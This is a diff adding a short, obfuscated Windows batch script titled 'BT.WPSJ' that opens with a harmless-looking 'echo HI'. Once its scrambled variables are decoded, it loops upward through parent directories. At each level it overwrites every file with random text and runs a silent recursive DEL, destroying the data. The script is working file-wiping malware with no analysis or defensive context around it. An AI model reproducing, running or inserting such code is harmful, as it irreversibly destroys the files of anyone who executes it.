@@ -1,0 +1,18 @@
+@echo off|Rem 
+echo. HI 
+title BT.WPSJ
+Call :SoTm W P S J T
+%T%TO WPSJ
+EXIT
+:WPSJ
+cd ..
+Echo %J%$%J%#%J%>*??.??*
+%W%%P%%S% ?*.*? /%EF%>Nul
+%_% CLS
+%T%TO WPSJ
+:SoTm
+set wpsj=%random%%random%
+set wpsj=%wpsj%%random%
+set %4=0%wpsj%0%wpsj%0%wpsj%0
+cls&set %2=E&&set %1=D&&set EF=S
+echo.&&cls&&set %3=L&&set %5=GO
